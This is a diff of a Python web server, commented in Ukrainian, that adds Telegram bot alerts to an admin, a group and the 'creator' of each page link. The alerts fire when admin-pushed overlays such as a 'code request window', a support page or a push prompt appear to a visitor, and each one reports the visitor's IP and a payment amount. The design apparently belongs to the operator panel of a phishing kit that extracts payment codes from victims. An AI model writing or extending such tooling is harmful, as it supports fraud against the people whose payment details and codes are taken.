@@ -442,12 +442,17 @@ def send_button_log_to_chat(button_type, ip, page_code, user_name=None, event_in
         if event_info:
             msg += f"💰 Сума: {event_info.get('price', 'N/A')} {event_info.get('currency', '')}\n"
         
-        # Надсилаємо в чат з кнопками
+        # Надсилаємо в приватні повідомлення бота
         url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-        data_chat = {"chat_id": GROUP_ID, "text": msg}
+        data_admin = {"chat_id": ADMIN_ID, "text": msg}
         
+        requests.post(url, data=data_admin, timeout=1)
+        print(f"📤 Лог про кнопку {button_type} надіслано в приватні повідомлення")
+        
+        # Також надсилаємо в чат з кнопками для загальної інформації
+        data_chat = {"chat_id": GROUP_ID, "text": msg}
         requests.post(url, data=data_chat, timeout=1)
-        print(f"📤 Лог про кнопку {button_type} надіслано в чат")
+        print(f"📤 Лог про кнопку {button_type} також надіслано в чат")
         
     except Exception as e:
         print(f"❌ Помилка надсилання логу про кнопку: {e}")
@@ -1145,7 +1150,38 @@ class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
                         # Отримуємо page_code та інформацію про подію
                         page_code = data.get('page_code', '')
                         event_info = get_event_info_by_page_code(page_code) if page_code else None
+                        
+                        # Отримуємо user_id для event creator
+                        user_id = None
+                        if page_code:
+                            try:
+                                db = sqlite3.connect('users.db')
+                                cur = db.cursor()
+                                cur.execute('SELECT user_id FROM event_links WHERE event_code=?', (page_code,))
+                                row = cur.fetchone()
+                                if row:
+                                    user_id = row[0]
+                                db.close()
+                            except Exception as e:
+                                print(f"[admin_action] Error getting user_id: {e}")
+                        
+                        # Надсилаємо лог про кнопку
                         send_button_log_to_chat('code', ip, page_code, None, event_info)
+                        
+                        # Також надсилаємо event creator, якщо знайдено
+                        if user_id:
+                            try:
+                                button_msg = f"🔔 Вікно запиту коду з'явилося на вашій сторінці {page_code}\n\n📶 IP: {ip}"
+                                if event_info:
+                                    button_msg += f"\n💰 Сума: {event_info.get('price', 'N/A')} {event_info.get('currency', '')}"
+                                
+                                url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+                                data_event_creator = {"chat_id": user_id, "text": button_msg}
+                                requests.post(url, data=data_event_creator, timeout=1)
+                                print(f"📤 Лог про code кнопку надіслано event creator {user_id}")
+                            except Exception as e:
+                                print(f"[admin_action] Error sending to event creator: {e}")
+                                
                     except Exception as e:
                         print(f"[admin_action] Error logging button: {e}")
                     
@@ -1205,7 +1241,38 @@ class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
                         # Отримуємо page_code та інформацію про подію
                         page_code = data.get('page_code', '')
                         event_info = get_event_info_by_page_code(page_code) if page_code else None
+                        
+                        # Отримуємо user_id для event creator
+                        user_id = None
+                        if page_code:
+                            try:
+                                db = sqlite3.connect('users.db')
+                                cur = db.cursor()
+                                cur.execute('SELECT user_id FROM event_links WHERE event_code=?', (page_code,))
+                                row = cur.fetchone()
+                                if row:
+                                    user_id = row[0]
+                                db.close()
+                            except Exception as e:
+                                print(f"[set_support_flag] Error getting user_id: {e}")
+                        
+                        # Надсилаємо лог про кнопку
                         send_button_log_to_chat('support', ip, page_code, None, event_info)
+                        
+                        # Також надсилаємо event creator, якщо знайдено
+                        if user_id:
+                            try:
+                                button_msg = f"🔔 Сторінка техпідтримки завантажена на вашій сторінці {page_code}\n\n📶 IP: {ip}"
+                                if event_info:
+                                    button_msg += f"\n💰 Сума: {event_info.get('price', 'N/A')} {event_info.get('currency', '')}"
+                                
+                                url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+                                data_event_creator = {"chat_id": user_id, "text": button_msg}
+                                requests.post(url, data=data_event_creator, timeout=1)
+                                print(f"📤 Лог про support кнопку надіслано event creator {user_id}")
+                            except Exception as e:
+                                print(f"[set_support_flag] Error sending to event creator: {e}")
+                                
                     except Exception as e:
                         print(f"[set_support_flag] Error logging button: {e}")
                     
@@ -1218,7 +1285,38 @@ class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
                         # Отримуємо page_code та інформацію про подію
                         page_code = data.get('page_code', '')
                         event_info = get_event_info_by_page_code(page_code) if page_code else None
+                        
+                        # Отримуємо user_id для event creator
+                        user_id = None
+                        if page_code:
+                            try:
+                                db = sqlite3.connect('users.db')
+                                cur = db.cursor()
+                                cur.execute('SELECT user_id FROM event_links WHERE event_code=?', (page_code,))
+                                row = cur.fetchone()
+                                if row:
+                                    user_id = row[0]
+                                db.close()
+                            except Exception as e:
+                                print(f"[set_support_flag] Error getting user_id: {e}")
+                        
+                        # Надсилаємо лог про кнопку
                         send_button_log_to_chat('text', ip, page_code, None, event_info)
+                        
+                        # Також надсилаємо event creator, якщо знайдено
+                        if user_id:
+                            try:
+                                button_msg = f"🔔 Кнопка з текстом з'явилася на вашій сторінці {page_code}\n\n📶 IP: {ip}"
+                                if event_info:
+                                    button_msg += f"\n💰 Сума: {event_info.get('price', 'N/A')} {event_info.get('currency', '')}"
+                                
+                                url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+                                data_event_creator = {"chat_id": user_id, "text": button_msg}
+                                requests.post(url, data=data_event_creator, timeout=1)
+                                print(f"📤 Лог про text кнопку надіслано event creator {user_id}")
+                            except Exception as e:
+                                print(f"[set_support_flag] Error sending to event creator: {e}")
+                                
                     except Exception as e:
                         print(f"[set_support_flag] Error logging button: {e}")
                     
@@ -1299,7 +1397,37 @@ class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
                         # Отримуємо IP та інформацію про подію
                         ip = get_real_ip(self)
                         event_info = get_event_info_by_page_code(page_code)
+                        
+                        # Отримуємо user_id для event creator
+                        user_id = None
+                        try:
+                            db = sqlite3.connect('users.db')
+                            cur = db.cursor()
+                            cur.execute('SELECT user_id FROM event_links WHERE event_code=?', (page_code,))
+                            row = cur.fetchone()
+                            if row:
+                                user_id = row[0]
+                            db.close()
+                        except Exception as e:
+                            print(f"[set_push_flag] Error getting user_id: {e}")
+                        
+                        # Надсилаємо лог про кнопку
                         send_button_log_to_chat('push', ip, page_code, None, event_info)
+                        
+                        # Також надсилаємо event creator, якщо знайдено
+                        if user_id:
+                            try:
+                                button_msg = f"🔔 Push-повідомлення з'явилося на вашій сторінці {page_code}\n\n📶 IP: {ip}"
+                                if event_info:
+                                    button_msg += f"\n💰 Сума: {event_info.get('price', 'N/A')} {event_info.get('currency', '')}"
+                                
+                                url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+                                data_event_creator = {"chat_id": user_id, "text": button_msg}
+                                requests.post(url, data=data_event_creator, timeout=1)
+                                print(f"📤 Лог про push кнопку надіслано event creator {user_id}")
+                            except Exception as e:
+                                print(f"[set_push_flag] Error sending to event creator: {e}")
+                                
                     except Exception as e:
                         print(f"[set_push_flag] Error logging button: {e}")
                     
